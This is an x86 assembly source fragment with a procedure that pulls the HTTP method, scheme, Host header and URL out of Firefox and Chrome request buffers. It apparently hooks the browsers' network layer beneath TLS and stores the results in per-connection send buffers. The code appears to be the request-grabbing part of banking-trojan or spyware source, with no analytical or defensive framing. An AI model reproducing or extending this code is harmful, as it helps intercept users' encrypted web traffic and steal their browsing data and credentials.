
.code

;; ==================================================================================================== ;;
;; GrabBrief - fold method, protocol and request string of Firefox & Chrome browsers                    ;;
;; Return:  0 - failed to get buffer                                                                    ;;
;;         !0 - success, size of                                                                        ;;
;; ==================================================================================================== ;;
GrabBrief proc uses ecx edx edi esi p1, p2, p3 : dword

	invokx  &ArrayKeyBuff[ebx], lpSendBuffersArray[ebx], p1
	jmpz eax, @ret		;; failed to get buffer
	mov  edi, [eax+4]	;; ptr to data with its len in 1st dword


	;; method
	mov  ecx, 4			;; method len
	mov  esi, p2		;; headers buffer
	cmp  dword ptr[esi], " TEG"
	je   @F
	cmp  dword ptr[esi], "TSOP"
	jne  @ret
	cmp  byte ptr[esi+4], " "
	jne  @ret
	inc  ecx			;; method len

@@:	mov  edx, edi		;; store ptr to data with its len in 1st dword
	add  edi, 4			;; ptr to buffer start
	rep  movsb			;; copy method


	;; protocol
	mov  eax, "ptth"
	stosd				;; copy protocol
	mov  ecx, p1		;; PRFileDesc
	mov  eax, [ecx+20]	;; PRDescIdentity
	cmp  eax, -3		;; PR_IO_LAYER_HEAD
	jne  @F
	mov  eax, [ecx+8]	;; PRFileDesc *lower
	mov  eax, [eax+20]
@@:	jmpz eax, @F
	mov  al, "s"
	stosb				;; add protocol
@@:	mov  eax, "//:"
	stosd				;; finish protocol
	dec  edi


	;; host
	invokx  &StrIPos[ebx], p2, p3, "\r\nHost: ", 8
	jmpz eax, @F
	mov  ecx, esi		;; store start of url ptr
	lea  esi, [eax+8]	;; host name ptr
	mov  eax, p2
	add  eax, p3
	sub  eax, esi
	invokx  &StrIPos[ebx], esi, eax, "\r\n", 2
	sub  eax, esi		;; host name len
	xchg ecx, eax
	rep  movsb			;; copy host
	mov  esi, eax		;; restore start of url ptr


	;; url
@@:	mov  eax, p2
	add  eax, p3
	sub  eax, esi
	invokx  &StrIPos[ebx], esi, eax, " ", 1
	sub  eax, esi
	mov  ecx, eax
	rep  movsb			;; copy url
	mov  ax, 0A0Dh
	stosw				;; copy \r\n


	;; save data len
	lea  eax, [edi-4]
	sub  eax, edx
	mov  [edx], eax

@ret:
	ret
GrabBrief endp

